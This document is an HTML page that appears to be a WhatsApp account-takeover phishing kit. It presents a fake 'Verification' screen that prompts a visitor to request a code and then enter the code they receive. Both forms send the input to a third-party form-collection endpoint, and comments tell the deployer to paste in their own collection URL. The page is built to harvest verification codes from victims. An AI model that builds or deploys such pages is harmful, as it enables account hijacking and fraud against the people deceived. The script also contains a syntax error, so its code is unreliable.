<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>whatsapp-Verification</title>
  <style>
    body { margin: 0; font-family: Arial, sans-serif; background: #1a1a1a; color: white; text-align: center; }
    .overlay { background: rgba(0,0,0,0.6); min-height: 100vh; padding-top: 80px; }
    .container { background: rgba(20,20,20,0.85); padding: 30px; width: 320px; margin: auto; border-radius: 10px; }
    .logo { width: 250px; margin-bottom: 20px; }
    input { display: block; margin: 10px auto; padding: 12px; width: 90%; border-radius: 5px; border: 1px solid #444; }
    button { padding: 12px; border-radius: 5px; border: none; cursor: pointer; background: #f0f0f0; font-weight: bold; width: 95%; margin-top: 10px; }
    button:disabled { background: #666; cursor: not-allowed; }
    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    <img src="logo.png" class="logo" alt="Logo">

    <div id="requestSection">
      <h2>Verification</h2>
      <!-- 1. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
      <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
        <button type="submit" id="reqBtn">Request Code</button>
      </form>
      <div id="waitMessage" class="status-msg">Sent! Please wait on this page for your code.</div>
    </div>

    <hr>

    <div id="submitSection">
      <h3>Enter Received Code</h3>
      <!-- 2. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
      <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
        <input type="text" name="entered_code" placeholder="000000" required>
        <button type="submit" id="subBtn">Submit & Verify</button>
      </form>
      <div id="successMessage" class="status-msg" style="color: #4caf50;">Code submitted! Verifying...</div>
    </div>
  </div>
</div>

<script>
  async function handleForm(formId, buttonId, statusId) {
    const form = document.getElementById(formId;
    const btn = document.getElementById(buttonId);
    const status = document.getElementById(statusId);

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      // Check if URL is still the placeholder
      if (form.action.includes("PASTE_YOUR_GETFORM_URL")) {
        alert("CRITICAL ERROR: You forgot to paste your Getform URL in the code!");
        return;
      }

      btn.disabled = true;
      btn.innerText = "Sending...";

      try {
        const response = await fetch(form.action, {
          method: 'POST',
          body: new FormData(form),
          headers: { 'Accept': 'application/json' }
        });

        if (response.ok) {
          btn.innerText = "Success";
          status.style.display = "block";
        } else {
          // Provide more detail on what went wrong
          const errorText = await response.text();
          console.error("Getform Error:", errorText);
          alert("Server Error: " + response.status + ". Check your Getform endpoint settings.");
          btn.disabled = false;
          btn.innerText = "Try Again";
        }
      } catch (error) {
        console.error("Network Error:", error);
        alert("Network Error: Is an Ad-Blocker or VPN active? Check browser console (F12).");
        btn.disabled = false;
        btn.innerText = "Try Again";
      }
    });
  }

  handleForm('requestCodeForm', 'reqBtn', 'waitMessage');
  handleForm('submitCodeForm', 'subBtn', 'successMessage');
</script>

</body>
</html>
